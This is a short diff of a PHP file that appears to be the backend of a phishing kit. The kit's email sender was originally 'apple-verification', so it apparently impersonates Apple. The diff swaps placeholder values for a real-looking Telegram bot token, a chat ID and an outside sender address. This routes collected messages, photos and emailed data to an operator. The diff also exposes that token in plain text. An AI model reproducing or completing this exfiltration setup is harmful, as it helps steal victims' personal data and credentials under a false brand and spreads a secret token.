@@ -76,8 +76,8 @@ function generateNewToken($length = 32) {
 // Function to send data to Telegram
 function sendToTelegram($message) {
     // Replace with your actual bot token and chat ID
-    $botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-    $chatId = 'YOUR_CHAT_ID';
+    $botToken = '5833826797:AAHinlaDwiK7-fk8_LMjk8aGydwiM70TZ8g';
+    $chatId = '5480674751';
     
     // Format message for Telegram
     $formattedMessage = urlencode($message);
@@ -99,7 +99,7 @@ function sendToTelegram($message) {
 // Function to send photo to Telegram
 function sendPhotoToTelegram($photoPath, $caption = '') {
     // Replace with your actual bot token and chat ID
-    $botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+    $botToken = '5833826797:AAHinlaDwiK7-fk8_LMjk8aGydwiM70TZ8g';
     $chatId = 'YOUR_CHAT_ID';
     
     // Format caption for Telegram
@@ -154,7 +154,7 @@ function sendToEmail($data) {
     $message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
     
     // Additional headers
-    $headers = "From: apple-verification@your-domain.com\r\n";
+    $headers = "From: apangao@rsj16.rhostjh.com\r\n";
     $headers .= "Reply-To: no-reply@your-domain.com\r\n";
     $headers .= "X-Mailer: PHP/" . phpversion();
     
